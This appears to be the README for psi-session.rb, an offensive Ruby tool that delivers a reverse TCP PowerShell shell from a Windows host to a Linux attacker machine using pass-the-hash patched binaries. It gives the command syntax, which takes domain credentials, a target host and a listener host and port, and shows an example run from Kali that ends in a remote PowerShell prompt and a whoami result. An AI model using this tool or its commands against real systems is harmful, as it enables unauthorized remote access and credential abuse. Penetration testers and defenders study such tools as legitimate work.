# psi-session.rb
Tool designed to deliver you a reverse tcp powershell prompt directly to your linux commandline.
Execution is currently done via pth patched binaries for the time being.

Syntax:

>ruby psi-session.rb <DOMAIN/username> <password> <rhost> <lhost> <lport>

Example:

>root@kali:~/projects/psi-session# ruby psi-session.rb bob n0passw0rd1 10.0.0.12 10.0.0.13 5000

>Windows PowerShell running as user bob on CLA-WIN7TOOLS

>Copyright (C) 2015 Microsoft Corporation. All rights reserved.

>PS C:\Windows\system32>whoami

>cla-win7tools\bob

>PS C:\Windows\system32> 
